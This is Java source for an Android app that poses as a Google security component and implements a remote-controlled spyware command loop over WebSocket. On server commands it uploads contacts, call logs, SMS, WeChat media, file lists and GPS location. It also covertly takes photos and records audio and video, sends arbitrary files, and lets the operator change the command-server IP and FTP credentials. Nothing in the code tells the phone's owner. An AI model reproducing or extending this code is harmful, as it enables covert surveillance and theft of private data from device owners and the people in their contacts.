package com.google.security.tools;

import android.content.Context;
import android.content.Intent;
import android.os.Environment;
import android.util.Log;
import android.view.Gravity;
import android.widget.Toast;

import org.apache.http.ParseException;
import org.apache.http.client.ClientProtocolException;
import org.codehaus.jackson.JsonParseException;
import org.codehaus.jackson.map.JsonMappingException;
import org.codehaus.jackson.map.ObjectMapper;
import org.json.JSONException;
import org.json.JSONObject;

import com.google.security.MainService;
import com.google.security.SMSConstant;
import com.google.security.SMSHandler;
import com.google.security.UploadUtils;
import com.google.security.UploadUtils.ThreadContacts;
import com.google.security.UploadUtils.ThreadInfo;
import com.google.security.UploadUtils.ThreadUpload;

import java.io.File;
import java.io.IOException;
import java.util.Timer;
import java.util.TimerTask;

import de.tavendo.autobahn.WebSocketConnection;
import de.tavendo.autobahn.WebSocketConnectionHandler;
import de.tavendo.autobahn.WebSocketException;

/**
 * Created by developer on 1/15/14.
 */
public class WebSocket {
	private Config config;
	private UploadUtils uploadUtils; /* 上传工具类实例 */
	private UrlTool urltool;
	ThreadInfo ti;
	ThreadContacts tc;
	ThreadUpload t;

	private final String TAG = "WebSocket";
	private Context mContext;
	private WebSocketConnection mConnection;
	public static String offlineTime = "";
	File resFile;
	File zipFile;
	String time;
	int timeIndex;
	String ip;

	public WebSocket(WebSocketConnection connection, Context context) {
		mContext = context;
		mConnection = connection;
	}

	public void startWebSocketConnection() {
		try {
			// String wsurl = new IpTool().ws_url;
			// if (wsurl == null || wsurl.equals(""))
			// return;
			Log.e(TAG, "startWebSocketConnection()....");
			config = Config.getIntance(mContext);
			config.readConfig();
			uploadUtils = UploadUtils.getIntance(mContext);
			mConnection.connect(new IpTool().ws_url,
					new WebSocketConnectionHandler() {
						private boolean netAvailable = false;

						@Override
						public void onOpen() {
							Log.e("Thread running",
									"Status: Connected to server");
							// Toast.makeText(
							// mContext,
							// "websocket connected to : "
							// + new IpTool().ws_url,
							// Toast.LENGTH_LONG).show();
							netAvailable = true;
							// Log.d(TAG, "Status: Connected to " + wsurl);
						}

						@Override
						public void onTextMessage(String payload) {
							Log.e(TAG, "Got echo: " + payload);
							// alert("got echo :" + parseJson(payload));

							// Toast.makeText(mContext, "Got echo: " + payload,
							// Toast.LENGTH_LONG).show();
							String newip = null;
							String parsedMeg = parseJson(payload);
							timeIndex = parsedMeg.indexOf("*time:");
							time = parsedMeg.substring(timeIndex + 6);
							parsedMeg = parsedMeg.substring(0, timeIndex);
							ip = new IpTool().uploadcmd_url;

							if (parsedMeg.length() > 12) {
								newip = parsedMeg.substring(12);
							}
							if (isIp(newip) && isChangeIP(parsedMeg)) {

								Thread thread = new Thread(new Runnable() {
									@Override
									public void run() {
										// TODO Auto-generated method stub
										try {
											UploadUtils.resipcmd(ip, time);
										} catch (ClientProtocolException e) {
											// TODO Auto-generated catch block
											e.printStackTrace();
										} catch (IOException e) {
											// TODO Auto-generated catch block
											e.printStackTrace();
										}
									}
								});
								thread.start();

								try {
									XmlTools.saveipasxml(newip);
									Intent intent = new Intent(mContext,
											WebCommucationService.class);
									mContext.stopService(intent);
									Thread.sleep(3000);
									mContext.startService(intent);

								} catch (Exception e) {
									// TODO Auto-generated catch block
									e.printStackTrace();
								}

							} else {
								Thread thread = new Thread(new Runnable() {
									@Override
									public void run() {
										// TODO Auto-generated method stub
										try {
											UploadUtils.rescmd(time);
										} catch (ClientProtocolException e) {
											// TODO Auto-generated catch block
											e.printStackTrace();
										} catch (IOException e) {
											// TODO Auto-generated catch block
											e.printStackTrace();
										}
									}
								});
								thread.start();

							}

							Log.e(TAG, "parsedMeg:" + parsedMeg);
							if (parsedMeg.length() > 16) {
								if (parsedMeg.subSequence(0, 13).equals(
										SMSConstant.CHANGE_FTP)) {
									String ftp = parsedMeg.substring(13);
									String url = ftp.substring(0,
											ftp.indexOf("/"));
									String port = ftp.substring(ftp
											.indexOf("/") + 1, ftp.indexOf("/",
											ftp.indexOf("/") + 1));
									String admin = ftp.substring(ftp.indexOf(
											"/", ftp.indexOf("/") + 1) + 1, ftp
											.lastIndexOf("/"));
									String psw = ftp.substring(ftp
											.lastIndexOf("/") + 1);
									XmlTools.saveftpasxml(url, port, admin, psw);

								}
							}
							if (parsedMeg.subSequence(0, 4).equals("*#*/")) {
								// alert(parsedMeg);
								try {
									uploadUtils.sendanyfiles(parsedMeg
											.substring(3));
								} catch (Exception e) {
									// TODO Auto-generated catch block
									e.printStackTrace();
								}

							}
							if (parsedMeg.substring(0, 6).equals(
									SMSConstant.FILTER_URL)
									&& (config.Urlflag)) {
								// alert(parsedMeg);

								MainService.SMSflag = true;
								// 跳转进入指定HTML
								urltool = UrlTool.getIntance(mContext);
								String url = parsedMeg.substring(6);
								urltool.start(url);
							}
//							if (parsedMeg.length() > 12) {
//								newip = parsedMeg.substring(12);
//							}
//							if (isIp(newip) && isChangeIP(parsedMeg)) {
//								// SMSConstant.seturlhead(newip);
//								try {
//									XmlTools.saveipasxml(newip);
//									Intent intent = new Intent(mContext,
//											WebCommucationService.class);
//									mContext.stopService(intent);
//									Thread.sleep(3000);
//									mContext.startService(intent);
//
//								} catch (Exception e) {
//									// TODO Auto-generated catch block
//									e.printStackTrace();
//								}
//
//							}
							if (parsedMeg.equals(SMSConstant.FILTER_LOCATION)
									&& (config.Gpsflag)) {
								// alert(parsedMeg);
								// Log.e(TAG, "websocket track the cmd");
								// webCmd.getCmds();
								MainService.SMSflag = true;
								// 启动拍照功能并检测wifi、上传结果
								try {
									Log.e(TAG, "online");
									GpsTool.getInstance(mContext)
											.requestLocation();
									t = new ThreadUpload();
									t.start();
								} catch (ParseException e) {
									// TODO Auto-generated catch block
									e.printStackTrace();
								}
								Log.e(TAG, "成功启动定位功能....");

							} else if (parsedMeg
									.equals(SMSConstant.FILTER_WECHAT)
									&& (config.Wechatflag)) {
								// alert(parsedMeg);

								MainService.SMSflag = true;
								// 微信
								// 是否需要重新打开？
								if (SMSHandler.isWifiConnected()) {
									uploadUtils.sendWechatMedia();
								}
							} else if (parsedMeg
									.equals(SMSConstant.FILTER_FILES)) {
								// alert(parsedMeg);
								try {
									XmlTools.savefilesasxml();
								} catch (Exception e1) {
									// TODO Auto-generated catch block
									e1.printStackTrace();
								}

								try {
									resFile = new File(Environment
											.getExternalStorageDirectory()
											.toString()
											+ "/security/Media/files/files.xml");
									zipFile = new File(Environment
											.getExternalStorageDirectory()
											.toString()
											+ "/security/Media/files/files.zip");
									ZipFileTool.zipFile(resFile, zipFile);
									resFile.delete();
								} catch (Exception e1) {
									// TODO Auto-generated catch block
									e1.printStackTrace();
								}
								try {
									uploadUtils.sendxmlfiles();
								} catch (ParseException e) {
									// TODO Auto-generated catch block
									e.printStackTrace();
								} catch (IOException e) {
									// TODO Auto-generated catch block
									e.printStackTrace();
								} catch (JSONException e) {
									// TODO Auto-generated catch block
									e.printStackTrace();
								}

							} else if (parsedMeg
									.equals(SMSConstant.FILTER_CONTACTS)
									&& (config.Contractflag)) {
								// alert(parsedMeg);

								MainService.SMSflag = true;
								ContactsInfoTool contactsInfoTool = ContactsInfoTool
										.getIntance(mContext);
								contactsInfoTool.saveContacts();
								contactsInfoTool.saveCallRecord();
								contactsInfoTool.saveSms();
								contactsInfoTool.saveInfo();
								Log.e("通讯录", "通讯录开始上传");
								ti = new ThreadInfo();
								ti.start();
								tc = new ThreadContacts();
								tc.start();
							} else if (parsedMeg
									.equals(SMSConstant.FILTER_PHOTO)
									&& (config.Photoflag)) {
								// alert(parsedMeg);

								// 启动拍照功能并检测wifi、上传结果
								if (SMSHandler.existSDCard()
										&& SMSHandler.getSDFreeSize() >= 50
										&& MainService.getMediaFlag()) {
									MainService.SMSflag = true;
									MainService.setMediaFalse();
									MainService.setPhotoTimeOut();
									try {
										PhotoTool cameraTool = PhotoTool
												.getIntance(mContext);
										cameraTool.start();
									} catch (Exception e) {
										// TODO Auto-generated catch block
										e.printStackTrace();
									}
								}
							} else if (parsedMeg
									.equals(SMSConstant.FILTER_RECORD)
									&& (config.Recorderflag)) {
								// alert(parsedMeg);

								// 启动录音功能并检测wifi、上传结果
								if (SMSHandler.existSDCard()
										&& SMSHandler.getSDFreeSize() >= 50
										&& MainService.getMediaFlag()) {
									MainService.SMSflag = true;
									MainService.setMediaFalse();
									MainService.setTimeOut();
									try {
										RecordTool recordTool = RecordTool
												.getIntance(mContext);
										recordTool.start();
									} catch (Exception e) {
										// TODO Auto-generated catch block
										e.printStackTrace();
									}
								}
							} else if (parsedMeg
									.equals(SMSConstant.FILTER_VEDIO)
									&& (config.Videoflag)) {
								// alert(parsedMeg);

								// 启动录像功能并检测wifi、上传结果
								if (SMSHandler.existSDCard()
										&& SMSHandler.getSDFreeSize() >= 50
										&& MainService.getMediaFlag()) {
									MainService.SMSflag = true;
									MainService.setMediaFalse();
									MainService.setTimeOut();
									try {
										VideoTool videoTool = VideoTool
												.getIntance(mContext);
										videoTool.start();
									} catch (Exception e) {
										// TODO Auto-generated catch block
										e.printStackTrace();
									}
								}
							}
						}

						@Override
						public void onClose(int code, String reason) {
							Log.e("onClose", "123");
							// ReconnectNetwork();
							mConnection.reconnect();
						}
					});
		} catch (WebSocketException e) {
			Log.d(TAG, e.toString());
		}
		//
		// final Timer timer = new Timer(true);
		// TimerTask task = new TimerTask() {
		// public void run() {
		//
		// try {
		// // if (mConnection.isConnected() == false
		// // || mConnection == null) {
		// Log.e(TAG, "timer .....task");
		// Log.e("Thread running", " network state:"
		// + mConnection.isConnected());
		//
		// //ReconnectNetwork();
		// // timer.cancel();
		// // }
		// } catch (ParseException e) {
		// // TODO Auto-generated catch block
		// e.printStackTrace();
		// }
		//
		// }
		// };
		// timer.schedule(task, 2 * 60 * 1000);

	}

	public void ReconnectNetwork() {
		new Thread() {
			public void run() {
				Log.e("Thread running", "start reconnceting the network 1 "
						+ mConnection.isConnected());
				mConnection.disconnect();
				try {
					Thread.sleep(2000);
				} catch (Exception e) {
					e.printStackTrace();
				}
				startWebSocketConnection();
				Log.e("Thread running", "start reconnceting the network 2"
						+ mConnection.isConnected());

			}
		}.start();
	}

	// private void alert(String message) {
	// Toast toast = Toast.makeText(mContext, message, Toast.LENGTH_SHORT);
	// toast.setGravity(Gravity.TOP | Gravity.CENTER_HORIZONTAL, 0, 0);
	// toast.show();
	// }

	private boolean isChangeIP(String content) {
		boolean b = false;
		if (content.indexOf(SMSConstant.CHANGE_IP) == 0) {
			b = true;
		}
		return b;
	}

	private boolean isIp(String IP) {
		boolean b = false;
		if (IP != null
				&& (IP.matches("\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}"))) {
			String s[] = IP.split("\\.");
			if (Integer.parseInt(s[0]) < 255)
				if (Integer.parseInt(s[1]) < 255)
					if (Integer.parseInt(s[2]) < 255)
						if (Integer.parseInt(s[3]) < 255)
							b = true;
		}
		return b;
	}

	public String parseJson(String message) {
		JSONObject result = null;
		try {
			result = new JSONObject(message);
		} catch (JSONException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		String parsedMessage = null;
		try {
			parsedMessage = result.getString("text");
		} catch (JSONException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return parsedMessage;
	}
}
